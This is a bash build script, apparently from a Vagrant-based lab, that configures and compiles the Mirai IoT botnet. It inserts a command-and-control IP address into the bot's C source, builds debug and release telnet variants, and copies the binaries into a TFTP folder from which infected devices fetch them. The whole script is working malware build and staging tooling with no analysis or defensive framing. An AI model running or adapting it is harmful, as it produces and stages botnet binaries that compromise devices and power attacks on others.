#!/usr/bin/env bash
base_dir=$(dirname "$0")

# process {DNS}
cp /vagrant/mirai/bot/resolv.cpp /vagrant/mirai/bot/resolv.c
cp /vagrant/mirai/bot/util.cpp /vagrant/mirai/bot/util.c
DNS=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/resolv.c
sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/util.c

# process {NI}
cp /vagrant/mirai/bot/const.hpp /vagrant/mirai/bot/const.h
sed -i "s|{NI}|$ni|g;" /vagrant/mirai/bot/const.h

echo "cd /vagrant/mirai/"
      cd /vagrant/mirai/

# build debug
echo "./build.sh debug telnet"
      ./build.sh debug telnet


echo "cd /vagrant/mirai/"
      cd /vagrant/mirai/

# build release
echo "./build.sh release telnet"
      ./build.sh release telnet

echo "cp /vagrant/mirai/release/mirai* /vagrant/tftp/"
      cp /vagrant/mirai/release/mirai* /vagrant/tftp/
